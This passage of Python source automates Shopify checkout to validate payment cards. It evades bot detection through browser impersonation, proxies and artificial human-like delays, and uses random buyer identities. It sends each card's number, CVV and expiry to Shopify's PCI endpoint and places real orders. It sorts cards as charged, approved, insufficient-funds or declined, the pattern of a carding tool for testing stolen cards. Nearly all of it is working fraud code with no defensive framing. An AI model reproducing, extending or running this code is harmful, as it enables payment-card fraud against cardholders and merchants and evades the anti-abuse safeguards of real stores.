            "verification_value": cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card_name,
        },
        "payment_session_scope": shop_domain,
    })
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://checkout.pci.shopifyinc.com",
        "priority": "u=1, i",
        "referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
    }
    async with AsyncSession(impersonate=client.impersonate, timeout=15) as s:
        s.headers.update({"User-Agent": client.user_agent})
        if proxy_url:
            s.proxies = {"http": proxy_url, "https": proxy_url}
        resp = await s.post("https://checkout.pci.shopifyinc.com/sessions",
                            data=payload, headers=headers, timeout=15)
    return resp.status_code, resp.text


async def send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, price, proposal_id, build_id,
                        source_token, currency, country):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{"partialStreetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": false}}}},
        "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{"streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}}}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{"proposedAllocations": null, "proposedTotalAmount": {{"any": true}}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


async def send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                         stable_id, variant_id, price, proposal_id, build_id,
                         source_token, queue_token, email, currency, country):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{"partialStreetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": false}}}},
        "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{"streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}}}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{"proposedAllocations": null, "proposedTotalAmount": {{"any": true}}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


async def send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                         stable_id, variant_id, price, proposal_id, build_id,
                         source_token, queue_token, email, addr, currency, country):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{"proposedAllocations": null, "proposedTotalAmount": {{"any": true}}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


async def send_poll_for_receipt(client, shop_url, checkout_url, checkout_token, session_token,
                                build_id, source_token, poll_id, receipt_id, receipt_session_token):
    params = {
        "operationName": "PollForReceipt",
        "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id": poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers = _proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    resp = await client.get(full_url, headers=headers)
    return resp.status_code, resp.text


async def send_submit_for_completion(client, shop_url, checkout_url, checkout_token, session_token,
                                     stable_id, variant_id, price, submit_id, build_id,
                                     source_token, queue_token, email, addr, delivery_handle,
                                     shipping_amount, total_amount, pci_session_id, attempt_token,
                                     currency, country, signed_handles, is_digital=False, tax_amount=None):
    handle_lines = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id = generate_page_id()

    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{"deliveryStrategyByHandle": {{"handle": "{delivery_handle}", "customDeliveryRate": false}}, "options": {{}}}},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{"requestUrl": "{checkout_url}", "pageId": "{page_id}"}}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    currency = "USD"
    country = "US"
    parsed = urllib.parse.urlparse(shop_url)
    site_name = parsed.netloc or shop_url.replace("https://", "").replace("http://", "").split("/")[0]

    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name,
                         currency=currency, status=CheckStatus.ERROR)
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    email = generate_random_email()
    browser = DEFAULT_BROWSER

    client = AsyncTLSClient(timeout=15, proxy_url=proxy_url, browser=browser)

    try:
        try:
            title, product_id, product_handle, variant_id, price = await find_cheapest_product(
                client, shop_url, MIN_PRODUCT_PRICE, MAX_PRODUCT_PRICE
            )
            _ = title
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        try:
            checkout_url, checkout_token, session_token, checkout_html = await add_to_cart_and_checkout(
                client, shop_url, variant_id
            )
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId/buildId/sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = "CF_MANAGED_CHALLENGE" not in str(e)
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        await _human_delay(200, 500)

        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("no private_access_token id")
            await fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        await _human_delay(150, 400)

        try:
            js_urls = extract_all_checkout_js_urls(checkout_html, shop_url)
            if not js_urls:
                raise Exception("no checkout JS URLs")
            proposal_id = submit_id = poll_for_receipt_id = ""
            for js_url in js_urls:
                try:
                    js_body = await fetch_actions_js(client, js_url, shop_url)
                    pid, sid, poll = extract_ids_from_js(js_body)
                    if pid and sid:
                        proposal_id = pid
                        submit_id = sid
                        poll_for_receipt_id = poll or FALLBACK_POLL_ID
                        break
                except Exception:
                    continue
            if not proposal_id or not submit_id:
                raise Exception("no Proposal/Submit IDs found")
            if not poll_for_receipt_id:
                poll_for_receipt_id = FALLBACK_POLL_ID
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        await _human_delay(300, 700)

        try:
            _, proposal_body = await send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country)
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            if currency == "USD":
                sp = extract_seller_merchandise_price(proposal_body)
                if sp and sp != price:
                    price = sp
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("no queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        await _human_delay(200, 500)

        try:
            _, proposal2_body = await send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("no queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        try:
            addr = address_for_country(country)
            _, proposal3_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("no queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        try:
            _, proposal4_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("no queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result

        try:
            _, proposal5_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token4, email, addr, currency, country)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result

        try:
            gateways = extract_payment_gateways(proposal5_body)
            if gateways:
                for gw in gateways:
                    if gw.get("typename") == "PaymentProvider":
                        result.gateway = gw.get("display") or gw.get("name") or ""
                        break
                if not result.gateway:
                    result.gateway = gateways[0].get("display") or gateways[0].get("name") or ""
        except Exception:
            pass

        await _human_delay(300, 700)

        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("no identification signature")
            pci_status, pci_body = await send_pci_session(
                client, ident_sig, card_number,
                f"{addr.first_name} {addr.last_name}",
                card_month, card_year, card_cvv, site_name, proxy_url)
            _ = pci_status
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception("no PCI session ID")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        await _human_delay(200, 500)

        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("no queueToken")

            is_digital = not extract_is_shipping_required(proposal5_body)
            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("Step 10: no delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)
            if len(signed_handles) == 0 and not is_digital:
                result.retryable = True
                raise Exception("Step 10: no signedHandles")

            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("Step 10: no shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("Step 10: no total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax = extract_tax_amount(proposal5_body)
            current_total = total_amount

            for tax_attempt in range(1, 4):
                submit_status, submit_body = await send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
                    queue_token5, email, addr, delivery_handle, shipping_amount,
                    current_total, pci_session_id, attempt_token, currency, country,
                    signed_handles, is_digital=is_digital, tax_amount=current_tax)
                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    await asyncio.sleep(0.1)
                    continue
                break
            _ = submit_status

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    result.status = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                    result.retryable = any(k in error_msg.lower() for k in ['inventory', 'retry', 'try again', 'generic'])
                else:
                    result.status = CheckStatus.ERROR
                    result.error = Exception("Step 10: no receiptId")
                    result.retryable = True
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10: no receipt sessionToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            return result

        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re = re.compile(
            r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')

        for poll_num in range(1, 31):
            try:
                _, poll_body = await send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id,
                    receipt_id, receipt_session_token)
                receipt_type = ""
                m = type_name_re.search(poll_body)
                if m:
                    receipt_type = m.group(1)
                result.status_code = extract_receipt_status_code(poll_body, receipt_type)

                if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
                    result.status = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    receipt_link = extract_receipt_url(poll_body, shop_url)
                    result.receipt_url = receipt_link or shop_url
                    result.paid_site = shop_url
                    return result

                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_REQUIRED"
                    return result

                if receipt_type == "FailedReceipt":
                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    em = error_re.search(poll_body)
                    error_code = em.group(1) if em else ""
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                    elif error_code in ("CARD_DECLINED", "GENERIC_ERROR", "01003"):
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                        else:
                            result.status = CheckStatus.DECLINED
                            result.error = Exception(error_code)
                    return result

                delay = 500
                m2 = poll_delay_re.search(poll_body)
                if m2:
                    try:
                        d = int(m2.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                await asyncio.sleep(min(delay, 150) / 1000.0)
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"poll {poll_num} failed: {e}")
                return result

        result.status = CheckStatus.ERROR
        result.status_code = "PROCESSING"
        result.error = Exception("PROCESSING")
        result.retryable = True
        return result
    finally:
        await client.close()